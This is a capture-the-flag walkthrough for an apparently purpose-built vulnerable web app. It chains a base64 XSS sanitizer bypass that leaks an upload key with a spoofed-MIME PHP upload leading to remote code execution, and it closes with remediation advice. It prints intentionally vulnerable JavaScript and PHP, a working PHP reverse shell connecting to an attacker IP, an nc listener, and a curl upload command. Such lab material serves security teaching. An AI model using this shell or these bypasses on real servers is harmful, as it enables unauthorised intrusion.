# Control Room Challenge 2

# Challenge 2b — XSS + MIME Upload Bypass → Reverse Shell

**Category:** Web / XSS / File Upload / RCE  
**Prerequisite:** Admin session (complete Challenge 1 / brute-force first)

---

## Challenge 2 — Double-Encoded XSS → Upload Key

### Overview

The Operator Broadcast Terminal on the dashboard runs user input through a
sanitizer that blocks `<script>` tags, event handlers, `alert()`, `document`,
`window`, etc. However, if the input is detected as valid base64, it skips
sanitization entirely and injects the decoded string straight into `innerHTML`.
Injected `<script>` tags are then manually re-executed.

### The Vulnerable Code

```javascript
function renderTag() {
  const val = input.value;
  // If it looks like base64 — skip sanitizer, inject directly
  if (!/^[A-Za-z0-9+/]+=*$/.test(val.trim())) throw new Error('not base64');
  const decoded = atob(val.trim());
  output.innerHTML = decoded;           // <-- unsanitized injection

  // Re-execute injected <script> tags
  output.querySelectorAll('script').forEach(old => {
    const s = document.createElement('script');
    s.textContent = old.textContent;
    old.parentNode.replaceChild(s, old);
  });
}
```

The `key` variable is already in scope from the page `<head>`:

```php
<?php if ($role === 'admin'): ?>
<script>const key='<?= htmlspecialchars($upload_key) ?>';</script>
<?php endif; ?>
```

### Step-by-Step

**Step 1 — Try the direct payload (blocked)**

Type this into the Broadcast Terminal and click TRANSMIT:

```
<script>alert(key)</script>
```

The sanitizer strips the `<script>` tag. The terminal hints:
`escape the filter !!!`

**Step 2 — Base64-encode the payload**

Encode `<script>alert(key)</script>` to base64:

```bash
echo -n '<script>alert(key)</script>' | base64
```

Output:

```
PHNjcmlwdD5hbGVydChrZXkpPC9zY3JpcHQ+
```

**Step 3 — Submit the encoded payload**

Paste the base64 string into the Broadcast Terminal and click TRANSMIT:

```
PHNjcmlwdD5hbGVydChrZXkpPC9zY3JpcHQ+
```

The `renderTag()` function sees valid base64 characters (`A-Za-z0-9+/=`),
skips the sanitizer, decodes it back to `<script>alert(key)</script>`, injects
it into the DOM, and re-executes it.

**Step 4 — Collect the key**

An alert box pops up with the upload key:

```
7bc8459cca316181a7592e7600e04c53
```

This is `md5('Youwannabreakintheuploadfile')`.

### Why It Works

| Defense                | Present? | Notes                                            |
|------------------------|----------|--------------------------------------------------|
| Input sanitizer        | Yes      | Blocks direct `<script>`, event handlers, etc.   |
| Base64 bypass          | Yes      | Sanitizer is skipped entirely for base64 input   |
| innerHTML sink         | Yes      | Decoded HTML injected without escaping           |
| Script re-execution    | Yes      | Manually recreates and appends script elements   |

---

## Challenge 3 — MIME Upload Bypass → Reverse Shell

### Overview

The firmware uploader trusts the MIME type sent by the client without
inspecting the actual file content. There is no extension filter and the file
is saved with its original name inside a web-accessible directory. This means
you can upload a PHP reverse shell disguised as an image and execute it
directly through the browser.

### The Vulnerable Code (`upload.php`)

```php
// Validates only the client-supplied MIME type — never inspects file contents
$allowedMime = ['image/jpeg', 'image/png', 'application/x-php', 'application/octet-stream'];
if (!in_array($file['type'], $allowedMime, true)) {
    echo json_encode(['success' => false, 'message' => 'INVALID FILE TYPE ...']);
    exit;
}

// Saves file with its original filename — no extension stripping
$filename = basename($file['name']);
$dest     = $destDir . $filename;
move_uploaded_file($file['tmp_name'], $dest);
```

### Step-by-Step

**Step 1 — Recon**

`robots.txt` discloses the upload endpoint and destination:

```
Disallow: /upload.php
Disallow: /uploads/
```

**Step 2 — Unlock the upload panel**

Use the key obtained from the XSS challenge:

```
7bc8459cca316181a7592e7600e04c53
```

Enter it in the "FIRMWARE PACKAGE UPLOADER" unlock box and click UNLOCK.

**Step 3 — Create the reverse shell payload**

Create `shell.php` on your attacker machine:

```php
<?php
$ip   = '10.10.10.10';   // your attacker IP
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', [0=>$sock, 1=>$sock, 2=>$sock], $pipes);
?>
```

Replace `10.10.10.10` with your actual attacker IP.

**Step 4 — Start a listener**

```bash
nc -lvnp 4444
```

**Step 5 — Upload the shell**

The browser's upload form has a client-side MIME check too, so bypass it with
`curl` and a spoofed `Content-Type`:

```bash
curl -s -b "PHPSESSID=<your_session_cookie>" \
  -F "firmware=@shell.php;type=image/jpeg" \
  http://localhost/upload.php
```

Replace `<your_session_cookie>` with the value from browser DevTools
(`Application → Cookies → PHPSESSID`).

Expected response:

```json
{
  "success": true,
  "message": "Firmware package uploaded successfully.",
  "filename": "shell.php",
  "url": "/uploads/shell.php"
}
```

**Step 6 — Trigger the shell**

Visit the uploaded file in your browser or with curl:

```
http://localhost/uploads/shell.php
```

Your `nc` listener receives the connection:

```
Ncat: Connection from 192.168.142.131.
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```

You now have a remote shell on the server.

### Why It Works

| Defense              | Present? | Notes                                      |
|----------------------|----------|--------------------------------------------|
| Magic byte check     | No       | Only `$_FILES['type']` is checked          |
| Extension filter     | No       | `.php` files are accepted                  |
| Exec prevention      | No       | `uploads/` has no `.htaccess` blocking PHP |
| Filename sanitize    | Partial  | `basename()` only — no extension stripping |

The server trusts the client to report the correct MIME type. Sending
`image/jpeg` in the `Content-Type` of the multipart field is enough to bypass
the check entirely.

---

## Full Attack Chain Summary

```
[Challenge 1] Brute-force login
        ↓
  Admin session obtained
        ↓
[Challenge 2] Base64-encode <script>alert(key)</script>
              → Submit to Broadcast Terminal
              → Sanitizer bypassed
              → Upload key revealed: 7bc8459cca316181a7592e7600e04c53
        ↓
[Challenge 3] Upload shell.php with type=image/jpeg via curl
              → MIME check bypassed
              → shell.php saved to /uploads/
              → Visit /uploads/shell.php
              → Reverse shell connects back
```

---

## Remediation

**XSS:**
- Do not treat base64-encoded input as trusted — sanitize after decoding.
- Use `textContent` instead of `innerHTML` for user-controlled output.
- Implement a strict Content Security Policy (CSP) to block inline scripts.

**File Upload:**
- Use `finfo_file()` to check the real MIME type from magic bytes.
- Whitelist allowed extensions and rename uploaded files (e.g. UUID + `.jpg`).
- Store uploads outside the web root, or add `.htaccess` to deny PHP execution in `uploads/`.
- Never trust `$_FILES['type']`.
